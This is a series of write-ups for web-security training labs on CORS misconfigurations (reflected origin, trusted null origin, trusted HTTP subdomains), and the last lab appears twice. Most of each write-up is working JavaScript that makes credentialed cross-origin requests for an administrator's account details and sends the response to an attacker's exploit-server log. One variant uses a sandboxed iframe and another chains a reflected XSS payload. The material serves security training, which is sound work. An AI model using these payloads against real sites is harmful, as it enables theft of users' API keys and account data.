
# CORS vulnerability with basic origin reflection

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

---------------------------------------------

References: 
- https://portswigger.net/web-security/cors
- https://www.freecodecamp.org/news/exploiting-cors-guide-to-pentesting/

---------------------------------------------

Generated link: https://0a0800cc04a1819b81eb34770017009e.web-security-academy.net/

We have the endpoint "/accountDetails":



![img](images/CORS%20vulnerability%20with%20basic%20origin%20reflection/1.png)


Original code:

```
<html>
  <body>
    <script>

    #Initialize the XMLHttpRequest object, and the application URL vairable 
        var req = new XMLHttpRequest();
        var url = ("APPLICATION URL");

    #MLHttpRequest object loads, exectutes reqListener() function
      req.onload = retrieveKeys;

    #Make GET request to the application accounDetails location
        req.open('GET', url + "/accountDetails",true);
    
    #Allow passing credentials with the requests
    req.withCredentials = true;

    #Send the request 
        req.send(null);

    function retrieveKeys() {
            location='/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```

Updated code:


```
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("https://0a0800cc04a1819b81eb34770017009e.web-security-academy.net");
      req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
    
    req.withCredentials = true;

        req.send(null);

    function retrieveKeys() {
            location='/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```



![img](images/CORS%20vulnerability%20with%20basic%20origin%20reflection/2.png)

Decode:



![img](images/CORS%20vulnerability%20with%20basic%20origin%20reflection/3.png)

# CORS vulnerability with trusted null origin

This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

---------------------------------------------

References: 

- https://portswigger.net/web-security/cors



![img](images/CORS%20vulnerability%20with%20trusted%20null%20origin/1.png)

---------------------------------------------

We have user's information in /accountDetails:



![img](images/CORS%20vulnerability%20with%20trusted%20null%20origin/2.png)



We will send the payload:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a9e008604151c3181d9023f008a00cf.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a8d00d304c31c4a8174019d019500e6.exploit-server.net//log?key='+this.responseText;
};
</script>"></iframe>
```

We get a request from the administrator user:



![img](images/CORS%20vulnerability%20with%20trusted%20null%20origin/3.png)


# CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

Hint: If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.

---------------------------------------------

Reference: https://portswigger.net/web-security/cors





![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/1.png)
![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/2.png)

---------------------------------------------

Generated link: https://0a0900840416f0db818ac0da00ca0002.web-security-academy.net/


We find the endpoint /accountDetails:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/3.png)

There is a button to check the stock which opens a popup with the value:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/4.png)

We find a XSS here:

```
GET /?productId=<script>alert(1)</script>&storeId=1 HTTP/1.1
```





![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/5.png)
![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/6.png)

The url is the following one, a subdomain (stock) which uses HTTP:

```
http://stock.0a0900840416f0db818ac0da00ca0002.web-security-academy.net/?productId=%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
```

CORS code from previous lab:

```
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("URL");
        req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
        req.withCredentials = true;
        req.send(null);
        function retrieveKeys() {
            location='/log?key='+this.responseText;
        };
  </script>
  <body>
</html>
```

In one-line:

```
<script>var req = new XMLHttpRequest();var url = ("https://0a1e008d0469f84380c3c126007600c7.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url + "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='+this.responseText;};</script>
```

Added to the XSS exploit:

``` 
http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = ("https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url + "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='+this.responseText;};</script>&storeId=1
```

The “+” sign is deleted:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/7.png)

We will change “+” with "%2B

``` 
http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = ("https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url %2B "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='%2Bthis.responseText;};</script>&storeId=1
```

Now we get the request in the logs:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/8.png)

Now we will add it to a payload like this so it opens when the message is received:

```
<body onload="window.open('URL')">
```

There are problems with nested quotes and double quotes so I will create a parameter “payload” with the CORS payload and send it to the victim:

```
<html>
<script>
var payload = "var req = new XMLHttpRequest();var url = (\"https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net\");req.onload = retrieveKeys;req.open('GET', url %2B \"/accountDetails\",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='%2Bthis.responseText;};" ;
</script>

<body onload="window.open('http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>'+payload+'</script>&storeId=1')">
</html>
```

We get the information from administrator:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/9.png)

And decode the API key:



![img](images/CORS%20vulnerability%20with%20trusted%20insecure%20protocols/10.png)


# 10 - CORS vulnerability with trusted insecure protocols

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter

Hint: If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.

---------------------------------------------

Reference: https://portswigger.net/web-security/cors





![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/1.png)
![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/2.png)

---------------------------------------------

Generated link: https://0a0900840416f0db818ac0da00ca0002.web-security-academy.net/


We find the endpoint /accountDetails:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/3.png)

There is a button to check the stock which opens a popup with the value:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/4.png)

We find a XSS here:

```
GET /?productId=<script>alert(1)</script>&storeId=1 HTTP/1.1
```





![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/5.png)
![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/6.png)

The url is the following one, a subdomain (stock) which uses HTTP:

```
http://stock.0a0900840416f0db818ac0da00ca0002.web-security-academy.net/?productId=%3Cscript%3Ealert(1)%3C/script%3E&storeId=1
```

CORS code from previous lab:

```
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("URL");
        req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
        req.withCredentials = true;
        req.send(null);
        function retrieveKeys() {
            location='/log?key='+this.responseText;
        };
  </script>
  <body>
</html>
```

In one-line:

```
<script>var req = new XMLHttpRequest();var url = ("https://0a1e008d0469f84380c3c126007600c7.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url + "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='+this.responseText;};</script>
```

Added to the XSS exploit:

``` 
http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = ("https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url + "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='+this.responseText;};</script>&storeId=1
```

The “+” sign is deleted:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/7.png)

We will change “+” with "%2B

``` 
http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();var url = ("https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net");req.onload = retrieveKeys;req.open('GET', url %2B "/accountDetails",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='%2Bthis.responseText;};</script>&storeId=1
```

Now we get the request in the logs:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/8.png)

Now we will add it to a payload like this so it opens when the message is received:

```
<body onload="window.open('URL')">
```

There are problems with nested quotes and double quotes so I will create a parameter “payload” with the CORS payload and send it to the victim:

```
<html>
<script>
var payload = "var req = new XMLHttpRequest();var url = (\"https://0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net\");req.onload = retrieveKeys;req.open('GET', url %2B \"/accountDetails\",true);req.withCredentials = true;req.send(null);function retrieveKeys() {location='https://exploit-0ad800bc03553b4781f5cfa401d10095.exploit-server.net/log?key='%2Bthis.responseText;};" ;
</script>

<body onload="window.open('http://stock.0a7b003603ae3b2881ded09d00fe0071.web-security-academy.net/?productId=<script>'+payload+'</script>&storeId=1')">
</html>
```

We get the information from administrator:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/9.png)

And decode the API key:



![img](images/10%20-%20CORS%20vulnerability%20with%20trusted%20insecure%20protocols/10.png)
